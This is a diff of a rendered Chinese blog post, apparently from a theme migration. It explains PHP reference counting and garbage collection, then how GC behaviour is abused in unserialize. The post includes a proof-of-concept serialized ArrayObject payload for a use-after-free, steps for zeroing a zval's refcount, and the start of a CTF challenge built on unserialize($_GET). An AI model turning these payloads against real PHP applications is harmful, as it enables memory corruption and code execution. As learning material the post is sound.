-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试字符串引用计数&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试数组引用计数&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$c</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$c</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试int型计数&#x27;</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;e&#x27;</span> );<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;测试字符串引用计数&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;new string&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;测试数组引用计数&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$c</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="variable">$c</span>[<span class="number">2</span>]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;测试int型计数&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;e&#x27;</span> );</span><br></pre></td></tr></table></figure></div>
 
 <p>输出如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">测试字符串引用计数<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">1</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>) <span class="hljs-comment">//取地址引用时会改变</span><br>测试数组引用计数<br>c:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">3</span>, is_ref=<span class="hljs-number">0</span>) <br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-comment">//数组值改变后，之前引用全部废弃</span><br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">3</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">2</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;c&#x27;</span> (length=<span class="hljs-number">1</span>)<br>测试<span class="hljs-keyword">int</span>型计数e:(refcount=<span class="hljs-number">0</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">int</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//int型不计引用次数</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">测试字符串引用计数</span><br><span class="line">a:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>)</span><br><span class="line">a:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>)</span><br><span class="line">a:(refcount=<span class="number">2</span>, is_ref=<span class="number">1</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>) <span class="comment">//取地址引用时会改变</span></span><br><span class="line">测试数组引用计数</span><br><span class="line">c:(refcount=<span class="number">2</span>, is_ref=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">c:(refcount=<span class="number">3</span>, is_ref=<span class="number">0</span>) </span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">c:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="comment">//数组值改变后，之前引用全部废弃</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">2</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;c&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">测试<span class="keyword">int</span>型计数e:(refcount=<span class="number">0</span>, is_ref=<span class="number">0</span>)<span class="keyword">int</span> <span class="number">1</span>  <span class="comment">//int型不计引用次数</span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>PHP垃圾回收机制默认打开，可以设置php.ini值的<code>zend.enable_gc</code>，或者调用gc_enable() 和 gc_disable()函数。</p>
 <p>当垃圾回收机制打开时，算法判断在根缓存区满时，执行循环查找，根缓存区大小需要通过修改php源码文件Zend&#x2F;zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES，然后重新编译PHP，来修改这个值。</p>
@@ -335,15 +558,20 @@
 </blockquote>
 <h3 id="垃圾的产生"><a href="#垃圾的产生" class="headerlink" title="垃圾的产生"></a>垃圾的产生</h3><p>PHP中一些复杂数据类型头部有一个GC，用于支持垃圾回收。</p>
 <p>zend_reference 这个类型，这个是 PHP7 新增的变量类型，当对变量使用 “&amp;” 操作时，<u>会创建新的中间结构体 zend_reference，这个结构体会真正的指向对应的 value 结构。</u></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当进行如下赋值操作时</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>; <span class="hljs-comment">// $a -&gt; zend_string</span><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b,$a -&gt; zend_string</span><br><span class="hljs-variable">$c</span> = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当进行如下赋值操作时</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>; <span class="comment">// $a -&gt; zend_string</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>; <span class="comment">// $b,$a -&gt; zend_string</span></span><br><span class="line"><span class="variable">$c</span> = &amp;<span class="variable">$b</span>; <span class="comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span></span><br></pre></td></tr></table></figure></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png" srcset="/img/loading.gif" lazyload alt="image-20230405153644317"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png"
+                      alt="image-20230405153644317"
+                ></p>
 <blockquote>
 <p><code>$b和$c</code>的zval都是通过中间结构体再指向最终的zend_string</p>
 </blockquote>
 <h3 id="回收的过程"><a href="#回收的过程" class="headerlink" title="回收的过程"></a>回收的过程</h3><p>如果当变量的 refcount 减小后大于 0，PHP 并不会立即对这个变量进行垃圾鉴定和回收，而是放入一个缓冲区中，等这个缓冲区满了以后 (10000 个值) 再统一进行处理，加入缓冲区的是变量 zend_value 里的 gc，目前垃圾只会出现在数组和对象两种类型中，数组的情况上面已经介绍了，对象的情况则是成员属性引用对象本身导致的，其它类型不会出现这种变量中的成员引用变量自身的情况，所以垃圾回收只会处理这两种类型的变量。</p>
 <p>gc 的结构 zend_refcounted_h 具体如下:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_refcounted_h</span> &#123;<br>    <span class="hljs-type">uint32_t</span>         refcount; <span class="hljs-comment">// 记录 zend_value 的引用数</span><br>    <span class="hljs-keyword">union</span> &#123;<br>        <span class="hljs-keyword">struct</span> &#123;<br>            zend_uchar    type,  <span class="hljs-comment">// zend_value的类型, 与zval.u1.type一致</span><br>            zend_uchar    flags, <br>            <span class="hljs-type">uint16_t</span>      gc_info <span class="hljs-comment">// GC信息，记录在 gc 池中的位置和颜色，垃圾回收的过程会用到</span><br>        &#125; v;<br>        <span class="hljs-type">uint32_t</span> type_info;<br>    &#125; u;<br>&#125; zend_refcounted_h;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_zend_refcounted_h</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span>         refcount; <span class="comment">// 记录 zend_value 的引用数</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            zend_uchar    type,  <span class="comment">// zend_value的类型, 与zval.u1.type一致</span></span><br><span class="line">            zend_uchar    flags, </span><br><span class="line">            <span class="type">uint16_t</span>      gc_info <span class="comment">// GC信息，记录在 gc 池中的位置和颜色，垃圾回收的过程会用到</span></span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> type_info;</span><br><span class="line">    &#125; u;</span><br><span class="line">&#125; zend_refcounted_h;</span><br></pre></td></tr></table></figure></div>
 
 <p>一个变量只能加入一次缓冲区，为了防止重复加入，变量加入后会把 zend_refcounted_h.gc_info 置为 GC_PURPLE，即标为紫色，后续不会重复插入。</p>
 <h2 id="反序列化中的利用"><a href="#反序列化中的利用" class="headerlink" title="反序列化中的利用"></a>反序列化中的利用</h2><h3 id="destruct魔术方法"><a href="#destruct魔术方法" class="headerlink" title="__destruct魔术方法"></a>__destruct魔术方法</h3><p>当某个对象成为垃圾或者当对象被显式销毁时执行</p>
@@ -356,10 +584,10 @@
 </blockquote>
 <h3 id="旧版本GC"><a href="#旧版本GC" class="headerlink" title="旧版本GC"></a>旧版本GC</h3><p>简单的判断了一下变量的zval的refcount是否为0，是的话就释放否则不释放直至进程结束。</p>
 <h3 id="新版本GC-zval结构体"><a href="#新版本GC-zval结构体" class="headerlink" title="新版本GC-zval结构体"></a>新版本GC-zval结构体</h3><p>主动销毁变量：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;111&quot;</span>;<br><span class="hljs-variable">$temp_name</span> = &amp;<span class="hljs-variable">$name</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$temp_name</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span><br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line"><span class="variable">$temp_name</span> = &amp;<span class="variable">$name</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$temp_name</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="comment">//name:</span></span><br><span class="line"><span class="comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span></span><br><span class="line"><span class="comment">//name:</span></span><br><span class="line"><span class="comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span></span><br></pre></td></tr></table></figure></div>
 
 <p>refcount计数减1，说明unset并非一定会释放内存，当有两个变量指向的时候，并非会释放变量占用的内存，只是refcount减1.</p>
-<h3 id="触发垃圾回收"><a href="#触发垃圾回收" class="headerlink" title="触发垃圾回收"></a>触发垃圾回收</h3><p>该算法的实现可以在<code>Zend/zend_gc.c</code>（ <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c">https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c</a> ）中找到。每当销毁zval时（如在该zval上调用unset时），垃圾回收算法会检查其是否为数组或对象，除了这俩个类型外其他都不能包含循环引用，这一检查过程使用<code>gc_zval_possible_root</code>函数来实现。任何这种潜在的zval都被称为根（Root），并会被添加到一个名为<code>gc_root_buffer</code>的列表中。<br>然后，将会重复上述步骤，直至满足下述条件之一：</p>
+<h3 id="触发垃圾回收"><a href="#触发垃圾回收" class="headerlink" title="触发垃圾回收"></a>触发垃圾回收</h3><p>该算法的实现可以在<code>Zend/zend_gc.c</code>（ <a class="link"   target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c" >https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）中找到。每当销毁zval时（如在该zval上调用unset时），垃圾回收算法会检查其是否为数组或对象，除了这俩个类型外其他都不能包含循环引用，这一检查过程使用<code>gc_zval_possible_root</code>函数来实现。任何这种潜在的zval都被称为根（Root），并会被添加到一个名为<code>gc_root_buffer</code>的列表中。<br>然后，将会重复上述步骤，直至满足下述条件之一：</p>
 <ul>
 <li><code>gc_collect_cycles()</code>被手动调用</li>
 <li>垃圾存储空间将满。这也就意味着，在根缓冲区的位置已经存储了10000个zval，并且即将添加新的根。10000时预定义常量GC_ROOT_BUFFER_MAX_ENTRIES,当出现第10001个zval时，将再次调用gc_zval_possible_root进行检查，此时会调用<code>gc_collect_cycles</code>以处理并刷新当前缓冲区</li>
@@ -368,401 +596,449 @@
 <p>可以得到触发思路，填满垃圾存储空间</p>
 </blockquote>
 <h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化过程允许一遍又一遍地传递相同的索引，所以不断会填充内存空间。一旦重新使用数组索引，旧元素的引用计数器就会递减。在反序列化过程中将会调用<code>zend_hash_update</code>，它将调用旧元素的析构函数（Destructor）。每当zval被销毁时，都会涉及到垃圾回收。这也就意味着，所有创建的数组都会开始填充垃圾缓冲区，直至超出其空间导致对<code>gc_collect_cycles</code>的调用。</p>
-<h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// POC of the ArrayObject GC vulnerability</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$serialized_string</span> = <span class="hljs-string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$outer_array</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized_string</span>);<br><span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><span class="hljs-variable">$filler1</span> = <span class="hljs-string">&quot;aaaa&quot;</span>;<br><span class="hljs-variable">$filler2</span> = <span class="hljs-string">&quot;bbbb&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$outer_array</span>);<br></code></pre></td></tr></table></figure>
+<h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// POC of the ArrayObject GC vulnerability</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$serialized_string</span> = <span class="string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$outer_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_string</span>);</span><br><span class="line"><span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"><span class="variable">$filler1</span> = <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"><span class="variable">$filler2</span> = <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$outer_array</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p>实际上，一旦该示例执行，外部数组（由<code>$outer_array</code>引用）将会被释放，并且zval将会被<code>$filter2</code>的zval覆盖，导致输出”bbbb”。</p>
 <p>ArrayObject的反序列化函数接受对另一个数组的引用，以用于初始化的目的。这也就意味着，一旦我们对一个ArrayObject进行反序列化后，就可以引用任何之前已经被反序列化过的数组。此外，这还将允许我们将整个哈希表中的所有条目递减两次。</p>
 <p>1、得到一个应被释放的目标zval X；<br>2、创建一个数组Y，其中包含几处对zval X的引用：<code>array(ref_to_X, ref_to_X, […], ref_to_X)</code>；<br>3、创建一个ArrayObject，它将使用数组Y的内容进行初始化，因此会返回一次由垃圾回收标记算法访问过的数组Y的所有子元素。<br>通过上述步骤，我们可以操纵标记算法，对数组Y中的所有引用实现两次访问。但是，在反序列化过程中创建引用将会导致引用计数器增加2，所以还要找到解决方案：<br>4、使用与步骤3相同的方法，额外再创建一个ArrayObject。<br>一旦标记算法访问第二个ArrayObject，它将开始对数组Y中的所有引用进行第三次递减。我们现在就有方法能够使引用计数器递减，可以将该方法用于对任意目标zval的引用计数器实现清零。</p>
 <p>举个例子</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$flag</span> =<span class="hljs-string">&quot;flag&#123;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(time).<span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;中途退出啦&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&#123;&quot;</span>.<span class="title function_ invoke__">md5</span>(time).<span 